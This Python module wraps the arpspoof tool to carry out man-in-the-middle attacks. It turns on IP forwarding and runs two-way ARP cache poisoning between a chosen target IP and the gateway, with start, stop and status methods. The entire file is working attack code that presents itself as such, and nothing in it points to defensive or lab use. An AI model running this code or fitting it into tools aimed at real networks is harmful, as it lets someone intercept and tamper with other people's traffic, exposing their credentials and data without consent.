"""
ARP spoofing module using arpspoof.
"""

import signal
import subprocess
import threading


class ArpSpoofer:
    """ARP spoofing wrapper for MITM attacks."""

    def __init__(self, log_fn=None):
        self.log_fn = log_fn
        self.running = False
        self._proc_target = None  # arpspoof target -> gateway
        self._proc_gateway = None  # arpspoof gateway -> target
        self.target_ip = None
        self.gateway_ip = None
        self.interface = None

    def _log(self, level, message):
        if self.log_fn:
            self.log_fn(level, f"[arpspoof] {message}")

    def start(self, interface, target_ip, gateway_ip) -> tuple:
        """
        Start ARP spoofing between target and gateway.
        Returns (success, message).
        """
        if self.running:
            return False, "ARP spoof already running"

        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip

        try:
            # Enable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                           capture_output=True, timeout=5)

            # Spoof target (pretend to be gateway)
            self._proc_target = subprocess.Popen(
                ["arpspoof", "-i", interface, "-t", target_ip, gateway_ip],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT
            )

            # Spoof gateway (pretend to be target)
            self._proc_gateway = subprocess.Popen(
                ["arpspoof", "-i", interface, "-t", gateway_ip, target_ip],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT
            )

            self.running = True
            self._log("info", f"ARP spoofing started: {target_ip} <-> {gateway_ip}")
            return True, "ARP spoofing started"

        except FileNotFoundError:
            self._log("error", "arpspoof not found. Install with: sudo apt install dsniff")
            return False, "arpspoof not installed"
        except Exception as e:
            self._log("error", f"ARP spoof failed: {e}")
            return False, str(e)

    def stop(self):
        """Stop ARP spoofing."""
        self.running = False

        for proc in [self._proc_target, self._proc_gateway]:
            if proc:
                try:
                    proc.send_signal(signal.SIGTERM)
                    proc.wait(timeout=5)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass

        self._proc_target = None
        self._proc_gateway = None

        # Disable IP forwarding
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                       capture_output=True, timeout=5)

        self._log("info", "ARP spoofing stopped")

    def get_status(self) -> dict:
        """Return ARP spoof status."""
        return {
            "running": self.running,
            "target_ip": self.target_ip,
            "gateway_ip": self.gateway_ip,
            "interface": self.interface,
        }
